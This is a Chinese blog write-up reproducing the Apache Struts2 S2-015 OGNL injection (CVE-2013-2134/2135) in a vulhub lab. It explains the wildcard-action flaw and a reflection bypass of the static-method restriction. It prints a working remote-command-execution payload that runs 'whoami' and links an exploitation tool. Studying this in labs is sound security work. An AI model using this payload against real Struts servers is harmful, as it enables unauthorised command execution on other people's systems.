# CVE-2013-2134,CVE-2013-2135 S2-015 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15640634.html`](https://www.cnblogs.com/peace-and-romance/p/15640634.html)

### 0X00-引言

我哋呢班打工仔

通街走籴直头系坏肠胃

揾个些少到月底点够驶

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：

```
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package> 
```

上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。

还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的 setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 `#_memberAccess['allowStaticMethodAccess']=true` 来修改其值达到重获静态方法调用的能力。

这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder('calc')).start() 来解决，另外还可以借助 Java 反射机制去间接修改：

```
#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true) 
```

### 0X03-漏洞复现

* * *

##### 01-任意命令执行

payload

```
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()),#q} 
```

注意 url 编码且 payload 后要添加`.action`

![image-20211203111117803](img/4c07326934e0cddf5753a8aa539006fa.png)

回显成功

![image-20211203111150546](img/2aa02840494ca9539a8d4f13f8a9c4cb.png)

### 0X04-漏洞分析

* * *

略,暂时看不懂源码

### 0X05-工具检测

* * *

工具地址：[`github.com/Liqunkit/LiqunKit_`](https://github.com/Liqunkit/LiqunKit_)

![image-20211203111732302](img/fc43b55cecc6f696686fc1221e1e7c39.png)

![image-20211203111804953](img/66c2602ef83a66bdc987bf940ac6e25b.png)

### 0X06-查看日志

* * *

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

![image-20211203111427707](img/58b8226a76ac4e0ea61a12e9685697c9.png)

### 0X07-参考

* * *

[S2-015 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-015/README.zh-cn.md)